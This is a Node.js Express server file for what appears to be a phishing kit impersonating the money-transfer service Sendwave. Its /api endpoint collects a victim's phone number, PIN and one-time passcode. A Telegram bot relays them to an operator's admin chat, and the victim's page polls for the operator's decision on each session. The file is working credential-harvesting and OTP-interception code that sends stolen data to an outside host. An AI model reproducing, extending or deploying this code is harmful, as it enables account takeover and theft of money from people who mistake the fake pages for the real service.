
const express = require('express');
const cors    = require('cors');
const path    = require('path');
const fetch   = require('node-fetch');
const { BOT_TOKEN, ADMIN_CHAT_ID, PORT, APP_URL } = require('./config');
const SendwaveBot = require('./sendwave');

const app = express();
const bot = new SendwaveBot(BOT_TOKEN, ADMIN_CHAT_ID);

// ── Middleware ──
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'], allowedHeaders: ['Content-Type'] }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ── Webhook — receives Telegram button clicks ──
app.post('/webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    await bot.handleCallback(update.callback_query);
  }
  res.send('OK');
});

// ── Setup webhook via browser (use this if Telegram is blocked on your network) ──
app.get('/setup-webhook', async (req, res) => {
  try {
    const webhookUrl = `${APP_URL}/webhook`;
    const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${webhookUrl}`);
    const data = await result.json();
    console.log('Webhook setup result:', data);
    res.json(data);
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// ── API ──
app.all('/api', async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  const action = req.body.action || req.query.action || '';

  switch (action) {

    case 'login_attempt': {
      const countryFlag = req.body.countryFlag || '🌐';
      const countryCode = req.body.countryCode || '+';
      const phone       = req.body.phone       || '';
      const pin         = req.body.pin         || '';

      if (!phone || !pin) {
        return res.json({ success: false, error: 'Missing fields' });
      }

      const result = await bot.sendLoginAlert(countryFlag, countryCode, phone, pin);
      if (result && result.sessionId) {
        return res.json({ success: true, data: { sessionId: result.sessionId } });
      }
      return res.json({ success: false, error: 'Failed to create session' });
    }

    case 'otp_entered': {
      const sessionId   = req.body.sessionId  || '';
      const otp         = req.body.otp        || '';
      const countryCode = req.body.countryCode || '+';
      const phone       = req.body.phone      || '';

      if (!sessionId || !otp) {
        return res.json({ success: false, error: 'Missing data' });
      }

      await bot.sendOtpAlert(sessionId, otp, countryCode, phone);
      return res.json({ success: true });
    }

    case 'check_status': {
      const sessionId = req.query.sessionId || req.body.sessionId || '';
      if (!sessionId) {
        return res.json({ success: false, status: 'unknown' });
      }
      const status = bot.getSessionStatus(sessionId);
      return res.json({ success: true, status });
    }

    default:
      return res.json({ success: false, error: 'Invalid action' });
  }
});

// ── Start ──
app.listen(PORT, async () => {
  console.log(`✅ Sendwave bot running on port ${PORT}`);
  console.log(`   Webhook : /webhook`);
  console.log(`   API     : /api`);
  console.log(`   Static  : /public`);

  // Auto-register webhook with Telegram on startup
  try {
    const webhookUrl = `${APP_URL}/webhook`;
    const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${webhookUrl}`);
    const data = await result.json();
    console.log('✅ Webhook registered:', data);
  } catch (err) {
    console.error('❌ Failed to register webhook:', err.message);
  }
});
